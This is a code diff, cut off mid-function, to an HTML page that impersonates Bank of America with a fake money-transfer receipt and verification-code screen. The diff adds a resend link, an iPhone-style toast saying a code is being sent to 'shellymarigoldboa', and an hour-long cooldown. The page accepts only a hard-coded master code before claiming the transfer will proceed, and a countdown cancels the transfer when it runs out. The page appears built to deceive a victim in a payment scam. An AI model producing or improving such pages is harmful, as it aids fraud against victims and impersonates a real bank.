@@ -140,6 +140,24 @@
   .code-inputs{display:flex;gap:10px;justify-content:center;margin-top:6px}
   .code-inputs input{width:56px;height:62px;font-size:1.6rem;font-weight:800;text-align:center;border-radius:8px;border:2px solid rgba(2,6,23,0.06)}
   .submit-code{background:var(--bofa-red);color:white;padding:10px 14px;border-radius:8px;border:none;font-weight:800;cursor:pointer}
+  .meta-text{margin-top:10px;font-size:0.95rem;color:var(--muted)}
+  .meta-link{color:var(--bofa-blue);text-decoration:none;font-weight:800;cursor:pointer}
+  /* iPhone-style floating container */
+  .iphone-toast{
+    position:fixed;left:50%;transform:translateX(-50%);bottom:28px;
+    background:linear-gradient(180deg,rgba(255,255,255,0.98),rgba(250,250,252,0.98));
+    border-radius:22px;padding:14px 16px;box-shadow:0 18px 40px rgba(2,6,23,0.16);z-index:2000;
+    width:min(92%,420px);display:flex;gap:12px;align-items:center;border:1px solid rgba(2,6,23,0.04);
+    opacity:0;pointer-events:none;transition:opacity .24s ease,transform .24s ease;
+  }
+  .iphone-toast.show{opacity:1;pointer-events:auto;transform:translateX(-50%) translateY(0)}
+  .iphone-toast .left{width:44px;height:44px;border-radius:10px;overflow:hidden;flex:0 0 44px}
+  .iphone-toast .left img{width:100%;height:100%;object-fit:cover}
+  .iphone-toast .body{flex:1;display:flex;flex-direction:column;gap:6px}
+  .iphone-toast .title{font-weight:800}
+  .iphone-toast .subtitle{color:var(--muted);font-size:0.95rem}
+  .iphone-toast .countdown{font-weight:900;color:var(--bofa-red)}
+  .iphone-toast .close-btn{background:transparent;border:none;color:var(--muted);font-weight:700;cursor:pointer}
   .hidden{display:none !important}
   footer{padding:18px 12px;text-align:center;color:var(--muted);font-size:0.9rem;width:100%;max-width:var(--max-width);margin:0 auto}
   @media (max-width:780px){
@@ -149,6 +167,7 @@
     .logo{width:56px;height:56px}
     .receipt::after{background-size:320px auto;opacity:0.05}
     .code-inputs input{width:48px;height:52px;font-size:1.3rem}
+    .iphone-toast{bottom:18px;padding:12px}
   }
 </style>
 </head>
@@ -265,6 +284,10 @@
       <input class="digit" maxlength="1" inputmode="numeric" />
     </div>
 
+    <div class="meta-text" aria-live="polite">
+      Didn't receive code? <span id="resendLink" class="meta-link">Send again here</span>
+    </div>
+
     <button id="submitCode" class="submit-code">Submit Code</button>
     <div id="codeResult" style="min-height:20px;font-weight:700"></div>
     <div id="cancelMsg" class="hidden" style="color:#7a0a0a;font-weight:800">⛔ Transfer canceled — time expired. Please restart the transfer.</div>
@@ -273,8 +296,18 @@
 
 <footer>&copy; 2025 Bank of America Global Banking. All rights reserved.</footer>
 
+<!-- iPhone-style floating container -->
+<div id="iphoneToast" class="iphone-toast" role="status" aria-live="polite" aria-hidden="true">
+  <div class="left"><img src="https://i.imgur.com/q4HmdZ6.png" alt="logo small"></div>
+  <div class="body">
+    <div class="title" id="toastTitle">Sending code to shellymarigoldboa</div>
+    <div class="subtitle" id="toastSubtitle">Please wait <span class="countdown" id="resendCountdown">01:00:00</span> before requesting again</div>
+  </div>
+  <button class="close-btn" id="toastClose" aria-label="Close">✕</button>
+</div>
+
 <script>
-  // MASTER code (only this will be accepted)
+  // MASTER code
   const MASTER_CODE = '65768';
 
   // Elements
@@ -290,10 +323,19 @@
   const codeResult = document.getElementById('codeResult');
   const cancelMsg = document.getElementById('cancelMsg');
 
+  // Resend UI elements
+  const resendLink = document.getElementById('resendLink');
+  const iphoneToast = document.getElementById('iphoneToast');
+  const toastClose = document.getElementById('toastClose');
+  const resendCountdownEl = document.getElementById('resendCountdown');
+
+  // localStorage key for resend cooldown
+  const RESEND_KEY = 'boa_resend_cooldown_ts'; // stores timestamp when cooldown ends
+
   // initialize date
   dateEl.textContent = new Date().toLocaleString();
 
-  // helper show/hide using .hidden
+  // helper show/hide using classes
   function showOverlay(ms=1400){
     overlay.classList.remove('hidden');
     overlay.classList.add('show');
@@ -337,7 +379,7 @@
     trackBtn.disabled = false;
   });
 
-  // Send code: small delay, then open code screen
+  // Send code: small delay, then open code screen and start 2-hour verification timer
   sendCodeBtn.addEventListener('click', async () => {
     sendCodeBtn.disabled = true;
     const original = sendCodeBtn.textContent;
@@ -357,7 +399,7 @@
     codeResult.textContent = '';
   });
 
-  // Timer
+  // Timer for verification (2 hours)
   let remaining = 0;
   let timerInterval = null;
   function startTimer(seconds){
@@ -407,7 +449,7 @@
     });
   });
 
-  // submit code — now only accepts MASTER_CODE
+  // submit code — only accepts MASTER_CODE
   submitCodeBtn.addEventListener('click', () => {
     if(remaining <= 0){
       codeResult.textContent = 'Cannot submit — code expired.';
@@ -427,29 +469,44 @@
       codeResult.textContent = '✅ Code verified — transfer will proceed.';
       codeResult.style.color = '#047857';
     } else {
-      // incorrect code — show error, keep timer running
       codeResult.textContent = 'Incorrect code. Please try again.';
       codeResult.style.color = '#7a0a0a';
-      // optionally clear inputs for retry:
       digits.forEach(d => d.value = '');
       digits[0].focus();
     }
   });
 
-  // keyboard escape to reset to main
-  document.addEventListener('keydown', (e) => {
-    if(e.key === 'Escape'){
-      hideReceipt();
-      hideCode();
-      document.getElementById('main-card').classList.remove('hidden');
-      clearInterval(timerInterval);
-    }
-  });
+  // -------------------------
+  // Resend ("Send again here") logic
+  // -------------------------
+  // cooldown seconds (1 hour)
+  const RESEND_COOLDOWN = 60 * 60; // 3600s
+  let resendTimerInterval = null;
 
-  // initial UI state for CodePen
-  receiptWrap.classList.add('hidden');
-  codeWrap.classList.add('hidden');
-  overlay.classList.add('hidden');
-</script>
-</body>
-</html>
+  // format seconds -> HH:MM:SS
+  function fmtHMS(sec){
+    const hrs = Math.floor(sec/3600);
+    const mins = Math.floor((sec%3600)/60);
+    const secs = sec%60;
+    const pad = n => String(n).padStart(2,'0');
+    return `${pad(hrs)}:${pad(mins)}:${pad(secs)}`;
+  }
+
+  // check remaining cooldown from localStorage
+  function getResendRemaining(){
+    const ts = Number(localStorage.getItem(RESEND_KEY) || 0);
+    if(!ts) return 0;
+    const rem = Math.max(0, Math.floor((ts - Date.now())/1000));
+    return rem;
+  }
+
+  // start cooldown (store end timestamp)
+  function startResendCooldown(seconds = RESEND_COOLDOWN){
+    const endTs = Date.now() + seconds*1000;
+    localStorage.setItem(RESEND_KEY, String(endTs));
+    updateResendUI(); // ensure UI reflects cooldown
+  }
+
+  // show the iPhone-style toast with message and cooldown
+  function showIphoneToast(sending=true){
+    const rem = getRese
